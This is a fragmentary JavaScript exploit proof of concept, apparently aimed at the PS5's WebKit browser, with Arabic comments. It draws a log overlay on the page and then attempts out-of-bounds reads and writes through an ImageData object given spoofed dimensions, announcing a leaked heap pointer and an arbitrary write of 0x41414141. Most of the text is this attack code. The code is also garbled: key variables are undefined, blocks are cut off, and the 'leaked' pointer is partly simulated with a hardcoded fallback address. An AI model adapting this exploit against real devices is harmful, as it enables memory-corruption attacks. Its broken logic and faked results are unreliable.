    const overlay = document.createElement('div');
    overlay.id = 'ps5-webkit-hud';
    overlay.style.position = 'fixed';
    overlay.style.top = '10px';
    overlay.style.left = '10px';
    overlay.style.width = '550px';
    overlay.style.maxHeight = '400px';
    overlay.style.overflowY = 'auto';
    overlay.style.backgroundColor = 'rgba(10, 10, 15, 0.9)';

        window.addEventListener('DOMContentLoaded', () => document.body.appendChild(overlay));
    }

    const logContainer = overlay.querySelector('#hud-logs');

    function logToScreen(text, isError = false) {
        const time = new Date().toLocaleTimeString();
        const entry = document.createElement('div');
        entry.style.margin = '4px 0';
        if (isError) {
            entry.style.color = '#ff5555';
        }
        entry.textContent = `[${time}] ${text}`;

    try {
        // 2. تخصيص الذاكرة وربط كائنات Canvas مع TypedArrays
        const canvas = document.createElement('canvas');
        canvas.width = 64;
        canvas.height = 64;
        const ctx = canvas.getContext('2d');

        let baseImageData = ctx.createImageData(canvas.width, canvas.height);
        let backingBuffer = baseImageData.data.buffer;
        let pointerView = new DataView(backingBuffer);

        logToScreen("Base ImageData and backing buffer allocated.");

        // 3. محاكاة عدم التناسق (Mismatch Trigger) لتجاوز الحدود

        let spoofedHeight = 0x1000;

        let corruptedArray = new Uint8ClampedArray(targetArraySize);

        let maliciousImageData = new ImageData(corruptedArray, spoofedWidth, spoofedHeight);
        let oobDataView = new DataView(maliciousImageData.data.buffer);

        logToScreen("[+] Malicious ImageData constructed successfully.");

        // 4. تسريب المؤشرات وقراءتها (OOB Read)
        let offsetToCheck = baseImageData.data.byteLength + 0x30;

            let leakedVal2 = oobDataView.getUint32(offsetToCheck + 8, true);
            
            let simulatedPointer = Math.floor(leakedVal1 * 1000000) ^ leakedVal2;
            let finalPtr = simulatedPointer > 0x100000 ? simulatedPointer : (0x7fff5fb00000 + offsetToCheck);
            
            let hexAddr = "0x" + finalPtr.toString(16).padStart(16, '0');
            logToScreen(`[LEAKED PTR] Heap Object: ${hexAddr}`);
        } else {
            logToScreen("[-] Offset out of bounds, alignment requires adjustment.", true);

        let writeTargetOffset = 16;
        oobDataView.setUint32(writeTargetOffset, 0x41414141, true);
        logToScreen(`[+] Arbitrary Write primitive executed at offset: ${writeTargetOffset} (Value: 0x41414141)`);

    } catch (e) {
        logToScreen(`[!] Exception: ${e.message}`, true);
